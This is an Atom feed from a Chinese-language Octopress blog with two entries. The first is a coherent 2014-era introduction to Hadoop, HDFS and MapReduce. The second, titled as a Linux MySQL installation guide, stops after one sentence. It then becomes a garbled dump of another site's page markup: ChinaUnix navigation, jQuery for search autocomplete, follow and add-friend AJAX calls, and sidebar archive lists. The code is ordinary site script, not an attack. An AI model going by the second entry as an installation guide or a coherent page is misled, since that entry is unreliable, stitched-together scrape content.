<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Archulate's Blog]]></title>
  <link href="http://archulate.github.io/atom.xml" rel="self"/>
  <link href="http://archulate.github.io/"/>
  <updated>2014-03-03T23:08:07+08:00</updated>
  <id>http://archulate.github.io/</id>
  <author>
    <name><![CDATA[李立夫]]></name>
    <email><![CDATA[archulate@hotmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hadoop学习]]></title>
    <link href="http://archulate.github.io/blog/2014/03/03/hadoop/"/>
    <updated>2014-03-03T19:23:42+08:00</updated>
    <id>http://archulate.github.io/blog/2014/03/03/hadoop</id>
    <content type="html"><![CDATA[<!--more-->


<p><div id="cnblogs_post_body"><span style="FONT-SIZE: 14pt">&nbsp;&nbsp;&nbsp; 这里先大致介绍一下Hadoop.<br>&nbsp;&nbsp;&nbsp; 本文大部分内容都是从官网</span><a title=Hadoop href="http://lucene.apache.org/hadoop"><span style="FONT-SIZE: 14pt">Hadoop</span></a><span style="FONT-SIZE: 14pt">上来的。其中有一篇</span><a title=介绍HDFS的pdf文档 href="http://lucene.apache.org/hadoop/hdfs_design.pdf"><span style="FONT-SIZE: 14pt">介绍HDFS的pdf文档</span></a><span style="FONT-SIZE: 14pt">，里面对Hadoop介绍的比较全面了。我的这一个系列的Hadoop学习笔记也是从</span><a title=这里 href="http://wiki.apache.org/lucene-hadoop/GettingStartedWithHadoop"><span style="FONT-SIZE: 14pt">这里</span></a><span style="FONT-SIZE: 14pt">一步一步进行下来的，同时又参考了网上的很多文章，对学习Hadoop中遇到的问题进行了归纳总结。<br>&nbsp;&nbsp;&nbsp; 言归正传，先说一下Hadoop的来龙去脉。谈到Hadoop就不得不提到</span><a title=Lucene href="http://lucene.apache.org/"><span style="FONT-SIZE: 14pt">Lucene</span></a><span style="FONT-SIZE: 14pt">和</span><a title=Nutch href="http://lucene.apache.org/nutch/"><span style="FONT-SIZE: 14pt">Nutch</span></a><span style="FONT-SIZE: 14pt">。首先，<span style="COLOR: #0000ff">Lucene并不是一个应用程序，而是提供了一个纯Java的高性能全文索引引擎工具包</span>，它可以方便的嵌入到各种实际应用中实现全文搜索/索引功能。<span style="COLOR: #0000ff">Nutch是一个应用程序，是一个以Lucene为基础实现的搜索引擎应用</span>，Lucene为Nutch提供了文本搜索和索引的API，Nutch不光有搜索的功能，还有数据抓取的功能。在nutch0.8.0版本之前，Hadoop还属于Nutch的一部分，而从nutch0.8.0开始，将其中实现的NDFS和MapReduce剥离出来成立一个新的开源项目，这就是Hadoop，而nutch0.8.0版本较之以前的Nutch在架构上有了根本性的变化，那就是完全构建在Hadoop的基础之上了。在Hadoop中实现了Google的GFS和MapReduce算法，使Hadoop成为了一个分布式的计算平台。<br>&nbsp;&nbsp;&nbsp;其实，Hadoop并不仅仅是一个用于存储的分布式文件系统，而是设计用来在由通用计算设备组成的大型集群上执行分布式应用的框架。<br><br>&nbsp;&nbsp;&nbsp;<span style="COLOR: #0000ff">Hadoop包含两个部分：</span><br><br>&nbsp;&nbsp;&nbsp;<strong>1、HDFS<br></strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即Hadoop Distributed File System (Hadoop分布式文件系统)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HDFS具有高容错性，并且可以被部署在低价的硬件设备之上。HDFS很适合那些有大数据集的应用，并且提供了对数据读写的高吞吐率。HDFS是一个master/slave的结构，就通常的部署来说，在master上只运行一个Namenode，而在每一个slave上运行一个Datanode。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HDFS支持传统的层次文件组织结构，同现有的一些文件系统在操作上很类似，比如你可以创建和删除一个文件，把一个文件从一个目录移到另一个目录，重命名等等操作。Namenode管理着整个分布式文件系统，对文件系统的操作（如建立、删除文件和文件夹）都是通过Namenode来控制。&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是HDFS的结构：</span><br></p>

<p><div align=center src_cetemp="/images/cnblogs_com/wayne1017/HDFSArch.JPG"></p>

<p><div align=center src_cetemp="/images/cnblogs_com/wayne1017/HDFSArch.JPG"><img height=645 alt="" src="http://images.cnblogs.com/cnblogs_com/wayne1017/HDFSArch.JPG" width=861 border=0></div></p>

<p></div></p>

<p><br><span style="FONT-SIZE: 14pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上面的图中可以看出，Namenode，Datanode，Client之间的通信都是建立在TCP/IP的基础之上的。当Client要执行一个写入的操作的时候，命令不是马上就发送到Namenode，Client首先在本机上临时文件夹中缓存这些数据，当临时文件夹中的数据块达到了设定的Block的值（默认是64M）时，Client便会通知Namenode，Namenode便响应Client的RPC请求，将文件名插入文件系统层次中并且在Datanode中找到一块存放该数据的block，同时将该Datanode及对应的数据块信息告诉Client，Client便这些本地临时文件夹中的数据块写入指定的数据节点。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HDFS采取了副本策略，其目的是为了提高系统的可靠性，可用性。HDFS的副本放置策略是三个副本，一个放在本节点上，一个放在同一机架中的另一个节点上，还有一个副本放在另一个不同的机架中的一个节点上。当前版本的hadoop0.12.0中还没有实现，但是正在进行中，相信不久就可以出来了。<br><br>&nbsp;&nbsp;&nbsp;<strong>2、MapReduce的实现<br></strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><a title=MapReduce href="http://labs.google.com/papers/mapreduce.html"><span style="FONT-SIZE: 14pt">MapReduce</span></a><span style="FONT-SIZE: 14pt">是Google 的一项重要技术，它是一个编程模型，用以进行大数据量的计算。对于大数据量的计算，通常采用的处理手法就是并行计算。至少现阶段而言，对许多开发人员来说，并行计算还是一个比较遥远的东西。MapReduce就是一种简化并行计算的编程模型，它让那些没有多少并行计算经验的开发人员也可以开发并行应用。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MapReduce的名字源于这个模型中的两项核心操作：Map和 Reduce。也许熟悉Functional Programming（</span><a title=函数式编程 href="http://chn.blogbeta.com/232.html"><span style="FONT-SIZE: 14pt">函数式编程</span></a><span style="FONT-SIZE: 14pt">）的人见到这两个词会倍感亲切。简单的说来，Map是把一组数据一对一的映射为另外的一组数据，其映射的规则由一个函数来指定，比如对[1, 2, 3, 4]进行乘2的映射就变成了[2, 4, 6, 8]。Reduce是对一组数据进行归约，这个归约的规则由一个函数指定，比如对[1, 2, 3, 4]进行求和的归约得到结果是10，而对它进行求积的归约结果是24。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于MapReduce的内容，建议看看孟岩的这篇</span><a title="MapReduce:The free lunch is not over!" href="http://www.mengyan.org/blog/archives/2006/11/15/138.html"><span style="FONT-SIZE: 14pt">MapReduce:The Free Lunch Is Not Over!</span></a><br><br><span style="FONT-SIZE: 14pt">&nbsp;&nbsp;&nbsp;好了，作为这个系列的第一篇就写这么多了，我也是刚开始接触Hadoop，下一篇就是讲Hadoop的部署，谈谈我在部署Hadoop时遇到的问题，也给大家一个参考，少走点弯路。</span><br></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[linux下关于mySQL的安装和配置]]></title>
    <link href="http://archulate.github.io/blog/2014/03/03/mysql-install/"/>
    <updated>2014-03-03T18:50:40+08:00</updated>
    <id>http://archulate.github.io/blog/2014/03/03/mysql-install</id>
    <content type="html"><![CDATA[<!--more-->


<p>一、引言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 想使用Linux已经很长时间了，由于没有硬性任务一直也没&#8217;/></p>

<script language="javascript">

//用户是否在线

var isOnLine = '';

$(document).ready(function(){

    var blog = {'name': '', 'name_url': '', 'brief': ''};

    //消息通知显示和隐藏控制

    $('#show_message_slide_button').hover(

        function(){

            $('#message_slide_div').slideDown(100);                                            

        },

        function(){

            

        }

    );



    $('#message_slide_div').hover(

        function(){

            

        },

        function(){

            $('#message_slide_div').slideUp(100);

        }

    );

    

    //编辑博客名

    $('#editbna').click(function(){

        blog.name = $('#bnaspan a').text();

        var val = '<input id="bnainput" type="text" style="float:left" value="" rel="' +$(this).attr('rel') + '" /><input id="bnasub" type="button" style="float:left" class="btn1"><input id="bnacanl" type="button" style="float:left" class="btn2"><div class="clear"></div>';

        $('#bnaspan').html(val);

        $('#bnainput').val(blog.name);

        $(this).parent().hide();

    });

    

    $('#bnasub').live('click', function(){

        var rel = eval('({' + $('#bnainput').attr('rel') + '})');

        var name = $('#bnainput').val();

        if(name != blog.name){

            $.ajax({

                type: "POST",

                url: rel.url,   

                data: {

                    'name' : name

                },

                success:function(data){

                    if(data == 0){

                        $('#bnaspan').html(blog.name);

                        $('#bnaspan').html('<a href="' + rel.href + '">' + $('#bnaspan').html() + '</a>');

                    }else{

                        $('#bnaspan').html(data);

                        $('#bnaspan').html('<a href="' + rel.href + '">' + $('#bnaspan').html() + '</a>');

                    }

                    $('#editbna').parent().show();

                }

            });

        }else{

            $('#bnaspan').text(blog.name).html();

            $('#bnaspan').html('<a href="' + rel.href + '">' + $('#bnaspan').html() + '</a>');

            $('#editbna').parent().show();

        }

    });

    

    $('#bnacanl').live('click', function(){

        var rel = eval('({' + $('#bnainput').attr('rel') + '})');

        $('#bnaspan').html('<a href="' + rel.href + '">' + blog.name + '</a>');

        $('#editbna').parent().show();

    });

    

    //编辑签名

    $('#editbrief').click(function(){

        blog.brief = $('#briefem').text();

        var val = '<input id="brfinput" type="text" style="float:left" value="" rel="' + $(this).attr('rel') + '" /><input id="brfsub" style="float:left"  type="button" class="btn1"><input style="float:left"  id="brfcanl" type="button" class="btn2"><div class="clear"></div>';

        $('#briefem').html(val);

        $('#brfinput').val(blog.brief);

        $(this).parent().hide();

    });

    

    $('#brfsub').live('click', function(){

        var url = $('#brfinput').attr('rel');

        var brief = $('#brfinput').val();

        if(brief != blog.brief){

            $.ajax({

                type: "POST",

                url: url,   

                data: {

                    'brief' : brief

                },

                success:function(data){

                    if(data == 0){

                        $('#briefem').html(blog.brief);

                    }else{

                        $('#briefem').html(data);

                    }

                    $('#editbrief').parent().show();

                }

            });

        }else{

            $('#briefem').text(blog.brief).html();

            $('#editbrief').parent().show();

        }

    });

    

    $('#brfcanl').live('click', function(){

        $('#briefem').html(blog.brief);

        $('#editbrief').parent().show();

    });



});

</script>


<p></head></p>

<p><body></p>

<p><div class="box"></p>

<p>  <!-- 一级导航 --></p>

<p>  <div class="Blog_nav1"></p>

<pre><code>&lt;div class="Blog_nav1_2"&gt;&lt;a href="http://archulate.github.io/"&gt;&lt;img src="/image/default/1.png"&gt;&lt;/a&gt;&lt;a href="http://www.chinaunix.net" class="Blog_a1"&gt;Chinaunix首页&lt;/a&gt;　| 　&lt;a href="http://bbs.chinaunix.net" target="_blank"&gt;论坛&lt;/a&gt;　| 　&lt;a href="http://ask.chinaunix.net" target="_blank"&gt;问答&lt;/a&gt;　| 　&lt;a href="http://blog.chinaunix.net" target="_blank"&gt;博客&lt;/a&gt;&lt;span class="Blog_span1"&gt;&lt;/span&gt;

        &lt;a href="http://archulate.github.io/site/login.html" class="Blog_a1"&gt;登录&lt;/a&gt; | &lt;a href="http://u.it168.com/Register?webid=5&amp;returnUrl=http%3A%2F%2Fblog.chinaunix.net%2Fuid-20019131-id-1987421.html" class="Blog_a1"&gt;注册&lt;/a&gt;

      &lt;/div&gt;

&lt;!--自动提示层--&gt;

&lt;style&gt;

.bor13221{border:1px #bbb solid;width:206px;position:absolute;top:34px;left:0;background:#fff; z-index:9999;display:none}

.bor13221 li{height:26px;line-height:26px;padding-left:6px;color:#555;font-size:14px;cursor:pointer;}

.here{background:#f3f3f3;}

&lt;/style&gt;



&lt;!--自动提示层--&gt;

&lt;div class="Blog_nav1_3" style="position:relative; z-index:9999;"&gt;

 &lt;div class="bor13221"&gt;

  &lt;ul&gt;

  &lt;/ul&gt;

&lt;/div&gt;

  &lt;form action='/site/search.html' method='post'&gt;

    &lt;input type="text"  autocomplete="off"  class="Blog_txt1" id='search_input_id' name='keywords'&gt;

    &lt;select class="Bolg_sel1" name='type' id='search_type_blog'&gt;

      &lt;option value='blog'&gt;博文&lt;/option&gt;

      &lt;option value='author'&gt;博主&lt;/option&gt;

    &lt;/select&gt;

    &lt;input type="submit" value='' name='submit' class="Blog_btn1"&gt;

 &lt;/form&gt;

&lt;/div&gt;

&lt;div class="clear"&gt;&lt;/div&gt;

&lt;div class="Blog_nav1_layer1" id="message_slide_div" style="display:none;"&gt;

    &lt;ul&gt;

        &lt;li&gt;&lt;a href="http://archulate.github.io/message/private.html"&gt;私人消息()&lt;/a&gt;&lt;/li&gt;

        &lt;li&gt;&lt;a href="http://archulate.github.io/message/system.html"&gt;系统消息()&lt;/a&gt;&lt;/li&gt;

        &lt;li&gt;&lt;a href="http://archulate.github.io/member/request.html"&gt;好友请求()&lt;/a&gt;&lt;/li&gt;

        &lt;li&gt;&lt;a href="http://archulate.github.io/member/notification.html"&gt;通知管理()&lt;/a&gt;&lt;/li&gt;

    &lt;/ul&gt;

&lt;/div&gt;
</code></pre>

<p>  </div></p>

<p>   <script type="text/javascript"></p>

<pre><code>$(function(){

    //点击添加进文本框

    $(".bor13221 li").live( 'click' , function(e){

        if ( e &amp;&amp; e.stopPropagation )

        {

            //因此它支持W3C的stopPropagation()方法

            e.stopPropagation();

        }

        else

        {

            //否则，我们需要使用IE的方式来取消事件冒泡

            window.event.cancelBubble = true; 

        }

        $('#search_input_id').val($(this).text());

        $(".bor13221 ul").html('');

        $(".bor13221").hide();

    });

    $(".bor13221 ul li").live({

        mouseenter:

        function()

        {

            $(".bor13221 ul li").removeClass("here");

            $(this).addClass('here');

        },

        mouseleave:

        function()

        {

            $(".bor13221 ul li").removeClass("here");

            $(this).removeClass('here');

        }

    });

    //自动提示

    $('#search_input_id').keyup(function(event){

        //取消博主的提示

        var search_type_blog = $('#search_type_blog').val();

        if(search_type_blog == 'author') return false;



        var key = $(this).val();

        //获取键值

        var keycode = event.which; //38 上 40 下

        var count = $('.bor13221 ul li').length;

        if(key != '' &amp;&amp; keycode != 38 &amp;&amp; keycode != 40)

        {

            $.getJSON("http://api.sou.it168.com/autoWenKuCloud?jsoncallback=?",{"ty":"json","offset":"0","limit":"10","q":key}, function(result)

                {

                    var arr = result.data;



                    var html ='';

                    for (i=0;i&lt;arr.length ;i++ )   

                    {   

                        html += '&lt;li&gt;'+arr[i]+'&lt;/li&gt;';

                    } 



                    $('.bor13221 ul').html(html);

                    (arr.length &gt; 1) ?  $(".bor13221").show() : $(".bor13221").hide();

                }

            );

        }

        else if(keycode == 38)

        {

            if(count &gt; 0)

            {

                //遍历li

                var curr_li_num;

                $('.bor13221 ul li').each(function(index , dom){

                    if($(dom).attr('class') == 'here')

                    {

                        curr_li_num = index;

                        return false;

                    }

                }); 

                var next_li_num;

                if(typeof(curr_li_num) == 'undefined')

                {

                    next_li_num = count - 1;

                }

                else

                {

                    if(curr_li_num == 0)

                    {

                        next_li_num = count - 1;

                    }

                    else

                    {

                        next_li_num = curr_li_num - 1;

                    }

                }

                $(".bor13221 ul li").removeClass("here");

                $(".bor13221 ul li:eq(" + next_li_num + ")").addClass("here");

                $('#search_input_id').val($(".bor13221 ul li:eq(" + next_li_num + ")").text());

            }

        }

        else if(keycode == 40)

        {

            if(count &gt; 0)

            {

                //遍历li

                var curr_li_num;

                $('.bor13221 ul li').each(function(index , dom){

                    if($(dom).attr('class') == 'here')

                    {

                        curr_li_num = index;

                        return false;

                    }

                }); 

                var next_li_num;

                if(typeof(curr_li_num) == 'undefined')

                {

                    next_li_num = 0;

                }

                else

                {

                    if(curr_li_num == count - 1)

                    {

                        next_li_num = 0;

                    }

                    else

                    {

                        next_li_num = curr_li_num + 1;

                    }

                }

                $(".bor13221 ul li").removeClass("here");

                $(".bor13221 ul li:eq(" + next_li_num + ")").addClass("here");

                $('#search_input_id').val($(".bor13221 ul li:eq(" + next_li_num + ")").text());

            }

        }

    });

    $(document).click(function(e){

        $(".bor13221").hide();

    });



});
</code></pre>

<p>  </script></p>

<p>  <!-- 头 --></p>

<p>  <!-- 推荐博客--></p>

<p>  <div class="Blog_header1"></p>

<pre><code>    &lt;div class="Blog_header1_1"&gt;

  &lt;p class="Blog_p1" &gt;&lt;em&gt;&lt;a href="http://archulate.github.io/uid/20019131.html"&gt;运维 虚拟化 XEN 安全 linux IT管理&lt;/a&gt;&lt;/em&gt;      &lt;p class="Blog_p2" style="color:#125A94"&gt;我的CIO之路&lt;/p&gt;

&lt;/div&gt;

    &lt;div class="Blog_header1_2" id="hide_div1"&gt;

    &lt;span class="Blog_span3"&gt;&lt;/span&gt;

    &lt;div class="float_div1" style="white-space:nowrap;" onmouseover="javascript:isMove=false" onmouseout="javascript:isMove=true"&gt;

    &lt;ul id="noticev2"&gt;  

                    &lt;li&gt;&lt;a href="http://blog.chinaunix.net/uid-24789255-id-4019728.html" target="_blank"&gt;【原创评选】12-02月原创博文评选&lt;/a&gt;&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://blog.chinaunix.net/uid-24789255-id-3938601.html" target="_blank"&gt;2013第三季度“ChinaUnix博客之星”评选&lt;/a&gt;&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://dtcc.it168.com/" target="_blank"&gt;2014中国数据库技术大会&lt;/a&gt;&lt;/li&gt;

                &lt;/ul&gt;

    &lt;/div&gt;

&lt;/div&gt;

        &lt;div class="Blog_header1_3"&gt;&lt;a href="http://archulate.github.io/uid/20019131.html"&gt;首页&lt;/a&gt;　| 　&lt;a href="http://archulate.github.io/uid/20019131/abstract/1.html"&gt;博文目录&lt;/a&gt;　| 　&lt;a href="http://archulate.github.io/member/profile/uid/20019131.html"&gt;关于我&lt;/a&gt;&lt;/div&gt;
</code></pre>

<p>  </div></p>

<p>  <!-- 内容部分 --></p>

<pre><code>&lt;script type="text/javascript" src="http://archulate.github.io/highlight/scripts/XRegExp.js"&gt;&lt;/script&gt; &lt;!-- XRegExp is bundled with the final shCore.js during build --&gt;
</code></pre>

<p><script type="text/javascript" src="http://archulate.github.io/highlight/scripts/shCore.js"></script></p>

<p><script type="text/javascript" src="http://archulate.github.io/highlight/scripts/shAutoloader.js"></script></p>

<p><link type="text/css" rel="stylesheet" href="http://archulate.github.io/highlight/styles/shCore.css"/></p>

<p><link type="text/css" rel="Stylesheet" href="http://archulate.github.io/highlight/styles/shThemeDefault.css" /></p>

<p><link href="http://archulate.github.io/code/css/fck_editorarea.css" rel="stylesheet" type="text/css" /></p>

<p>  <div class="Blog_contain"></p>

<pre><code>&lt;!-- 左 --&gt;

&lt;script language="javascript"&gt;
</code></pre>

<p>$(document).ready(function(){</p>

<pre><code>$('#ConcernBtn').bind('click',function(){

        var cuid = '20019131';

        var url =  '/member/concern.html';

        var type = $(this).attr('rel');



        if(type == 'addConcern'){

            $.ajax({

                type : 'get',

                url  : url,

                data : {'op' : 'ajaxadd' , 'cuid' : cuid, 'random' : Math.random()},

                success : function(msg){    

                   if(msg == -1){

                       showErrorMsg('参数错误！');

                   } else if (msg == 0){

                       showErrorMsg('关注失败，没有该用户！');

                   } else if (msg == 1){

                       showErrorMsg('关注失败，您已经关注了该用户！');

                   } else if (msg == 2){

                       $('#ConcernBtn').val('已关注');

                       $('#ConcernBtn').attr('rel','delConcern');

                       showSucceedMsg('关注成功!');

                   } else if (msg == 3){

                       showErrorMsg('未知错误');

                   }

                }

            }); 

        } else if ( type == 'delConcern'){

            $.ajax({

                type : 'get',

                url  : url,

                data : {'op' : 'ajaxdel' , 'cuid' : cuid, 'random' : Math.random()},

                success : function(msg){

                   if(msg == 0){

                       showErrorMsg('参数错误！','消息提示');

                   } else if (msg == 1){

                       showErrorMsg('操作失败，请尝试刷新页面重试！','消息提示');

                   } else if (msg == 2){

                       $('#ConcernBtn').val('加关注');

                       $('#ConcernBtn').attr('rel','addConcern');

                       showSucceedMsg('成功取消关注！','消息提示');

                   } else if (msg == 3){

                       showErrorMsg('未知错误！','消息提示'); 

                   }

                }

            }); 

        }

});                    
</code></pre>

<p>});</p>

<p>//加好友</p>

<p>function addFriend(fuid, url){</p>

<pre><code>if(fuid == '' || fuid.length == 0){

    showErrorMsg('缺少参数！','信息提示');

    return false;

}

$.ajax({

       type : 'get',

       url : url,

       data : {'op' : 'add', 'fuid' : fuid , 'random' : Math.random()},

       success : function(msg){

            if(msg == -1){

                showErrorMsg('参数错误！','消息提示');

            } else if (msg == -2){

                showErrorMsg('添加好友失败,没有该用户的信息！','消息提示');

            } else if (msg == -3){

                showErrorMsg('添加好友失败,你不能添加自己为好友！','消息提示');

            } else if (msg == -4){

                showErrorMsg('添加好友未知错误,该错误已被记录！','消息提示');

            } else if (msg == -5){

                showErrorMsg('添加好友失败,你之前已经发送过好友请求,请耐心等待对方同意申请！','消息提示');

            } else if (msg == -6){

                showErrorMsg('添加好友失败,你们已经是好友了！','消息提示');

            } else {

                $.cover(true);

                asyncbox.open({

                    id : 'addFriend',

                    title : '添加好友',

                    url : url,

                    data : {'op' : 'add', 'fuid' : fuid , 'random' : Math.random()},

                    width : 490,

                    height : 180,

                    scroll : 'no',

                    callback : function(action) {

                        if (action == 'close'){

                            $.cover(false);

                        }   

                    }

                }); 

            }

       }

}); 
</code></pre>

<p>}</p>

<p>//发送短消息</p>

<p>function postMessage(msguid, url){</p>

<pre><code>if(msguid == '' || msguid.length == 0){

    showErrorMsg('缺少参数！','信息提示');

    return false;

}



$.ajax({

       type : 'post',

       url : url,

       data : {'op' : 'ajaxpost', 'msguid' : msguid , 'random' : Math.random()},

       success : function(msg){

            if(msg == -1){

                showErrorMsg('发送失败，缺少收件人对象！','消息提示');

            } else if(msg == -2){

                showErrorMsg('发送失败，自己不能给自己发送短消息！','消息提示');

            } else {

                $.cover(true);

                asyncbox.open({

                    id : 'postMessage',

                    title : '发送短消息',

                    url : url,

                    data : {'op' : 'ajaxpost', 'msguid' : msguid , 'random' : Math.random()},

                    width : 510,

                    height : 255,

                    scroll : 'no',

                    callback : function(action) {

                        if (action == 'close'){

                            $.cover(false);

                        }   

                    }

                }); 

            }

       }

}); 
</code></pre>

<p>}</p>

<p></script></p>

<p><div class="Blog_left"></p>

<pre><code>  &lt;div class="Blog_left1 Blog_bg1"&gt;

    &lt;div class="Blog_left1_1"&gt;

        &lt;!-- 专家博客--&gt;

        &lt;a href="http://archulate.github.io/uid/20019131.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/020/01/91/31_avatar_middle.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_middle.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/20019131.html"&gt;solaris小兵&lt;/a&gt;&lt;/p&gt;

    &lt;/div&gt;

    &lt;ul class="Blog_ul1 Blog_noline1"&gt;

      &lt;li&gt;博客访问： 306993 &lt;/li&gt;

      &lt;li&gt;博文数量： 142 &lt;/li&gt;

      &lt;li&gt;博客积分： 7242 &lt;/li&gt;

      &lt;!--&lt;li&gt;专家积分： 180&lt;/li&gt;--&gt;

      &lt;li&gt;博客等级： 少将 &lt;/li&gt;

      &lt;li&gt;技术积分： 1430 &lt;/li&gt;

      &lt;li&gt;用  户  组：  普通用户&lt;/li&gt;

      &lt;li&gt;注册时间： 2005-06-06 14:59 &lt;/li&gt;

              &lt;/ul&gt;  







            &lt;div class="HT_line3 HT_line3_1"&gt;&lt;/div&gt;

    &lt;ul class="Blog_ul2"&gt;

      &lt;li&gt;&lt;input type="button" value="加关注" id="ConcernBtn" onclick="showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html')"&gt;&lt;/li&gt;

      &lt;li&gt;&lt;input type="button" value="短消息" id="postMessageBtn" onclick="showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html')"&gt;&lt;/li&gt;

      &lt;li&gt;&lt;input type="button" value="论坛" onclick="location.href='http://bbs.chinaunix.net'"&gt;&lt;/li&gt;

      &lt;li&gt;&lt;input type="button" value="加好友" id="addFriendBtn" onclick="showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html')"&gt;&lt;/li&gt;

    &lt;/ul&gt;

          &lt;/div&gt;





  &lt;div class="Blog_left2 Blog_bg1"&gt;

    &lt;div class="Blog_tit1"&gt;文章分类&lt;/div&gt;

    &lt;div class="Blog_left2_1"&gt;

      &lt;p class="Blog_p4"&gt;&lt;a href="http://archulate.github.io/uid/20019131/list/1.html"&gt;全部博文&lt;/a&gt;（142）&lt;/p&gt;

      &lt;ul id="blogCla"&gt;

                        &lt;li&gt;&lt;span class="Blog_jia1"&gt;&lt;/span&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49302-list-1.html" title="win"&gt;win&lt;/a&gt;（4）

                                &lt;div style="display:none;" class="zk"&gt;

                                        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/20019131/sid-49303-list-1.html" title="windows 虚拟化"&gt;windows 虚拟化&lt;/a&gt;（3）&lt;/p&gt;

                                    &lt;/div&gt;

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49301-list-1.html" title="篮球NBA"&gt;篮球NBA&lt;/a&gt;（4）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49297-list-1.html" title="IT管理 ITSM ITIL"&gt;IT管理 ITSM ITIL&lt;/a&gt;（21）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49300-list-1.html" title="性能测试"&gt;性能测试&lt;/a&gt;（5）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49299-list-1.html" title="mysql"&gt;mysql&lt;/a&gt;（8）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49298-list-1.html" title="memcache"&gt;memcache&lt;/a&gt;（5）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49296-list-1.html" title="虚拟化"&gt;虚拟化&lt;/a&gt;（17）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49295-list-1.html" title="安全"&gt;安全&lt;/a&gt;（10）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49294-list-1.html" title="nagios"&gt;nagios&lt;/a&gt;（5）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49293-list-1.html" title="jboss"&gt;jboss&lt;/a&gt;（6）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49292-list-1.html" title="weblogic"&gt;weblogic&lt;/a&gt;（1）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49289-list-1.html" title="suse"&gt;suse&lt;/a&gt;（0）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49288-list-1.html" title="solaris"&gt;solaris&lt;/a&gt;（1）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49291-list-1.html" title="linux"&gt;linux&lt;/a&gt;（38）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid-49290-list-1.html" title="心情随想"&gt;心情随想&lt;/a&gt;（16）

                            &lt;/li&gt;

                        &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/cid--1-list-1.html" title="未分配的博文"&gt;未分配的博文&lt;/a&gt;（1）

                            &lt;/li&gt;

                  &lt;/ul&gt;

    &lt;/div&gt;

  &lt;/div&gt;

                  &lt;div class="Blog_left2 Blog_bg1"&gt;

    &lt;div class="Blog_tit1"&gt;文章存档&lt;/div&gt;

    &lt;div class="Blog_left2_1" id="blogdtr"&gt;

                &lt;p class="Blog_p4"&gt;&lt;span class="Blog_jia1"&gt;&lt;/span&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-2011-list-1.html"&gt;2011年&lt;/a&gt;（1）&lt;/p&gt;

      &lt;ul style="display:none;" class="Blog_ul3 zk"&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201107-list-1.html"&gt;2011年07月&lt;/a&gt;（1）&lt;/li&gt;

                  &lt;/ul&gt;

                &lt;p class="Blog_p4"&gt;&lt;span class="Blog_jia1"&gt;&lt;/span&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-2010-list-1.html"&gt;2010年&lt;/a&gt;（12）&lt;/p&gt;

      &lt;ul style="display:none;" class="Blog_ul3 zk"&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201010-list-1.html"&gt;2010年10月&lt;/a&gt;（1）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201009-list-1.html"&gt;2010年09月&lt;/a&gt;（1）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201006-list-1.html"&gt;2010年06月&lt;/a&gt;（3）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201005-list-1.html"&gt;2010年05月&lt;/a&gt;（2）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201003-list-1.html"&gt;2010年03月&lt;/a&gt;（2）&lt;/li&gt;

